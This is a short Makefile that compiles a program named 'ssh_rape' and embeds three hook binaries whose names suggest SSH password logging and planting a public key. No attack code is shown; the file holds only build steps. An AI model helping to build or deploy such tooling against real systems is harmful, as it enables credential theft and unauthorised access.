all:
	$(MAKE) -C hook
	xxd -i hook/passlog.bin > src/passlog.c
	xxd -i hook/pubkey.bin > src/pubkey.c
	xxd -i hook/menu.bin > src/menu.c
	gcc -Wall -ggdb -I./include/ -o ssh_rape src/*.c 

clean:
	rm -rf ssh_rape
